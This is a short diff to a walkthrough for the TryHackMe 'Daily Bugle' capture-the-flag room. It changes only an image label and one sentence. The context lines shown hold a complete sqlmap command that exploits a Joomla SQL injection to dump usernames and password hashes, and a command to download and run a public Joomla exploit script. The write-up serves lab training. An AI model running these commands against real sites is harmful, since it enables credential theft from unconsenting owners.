@@ -1,6 +1,6 @@
 # The Daily Bugle
 
-| [![Jenkins](../../_static/images/skynet.png)](https://tryhackme.com/room/dailybugle) |
+| [![Daily Bugle](../../_static/images/skynet.png)](https://tryhackme.com/room/dailybugle) |
 |:--:|
 | [https://tryhackme.com/room/dailybugle](https://tryhackme.com/room/dailybugle) |
 
@@ -127,7 +127,7 @@ Dump the username and password columns from the `users` table:
 
     sqlmap -u "http://<IP address target machine>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T "#__users" -C username,password -p list[fullordering] --dump
 
-This python script is specific for Joomla:
+As an alternative, this python script is specific for Joomla:
 
     # wget https://raw.githubusercontent.com/stefanlucas/Exploit-Joomla/master/joomblah.py
     # python joomblah.py http://<IP address target machine>
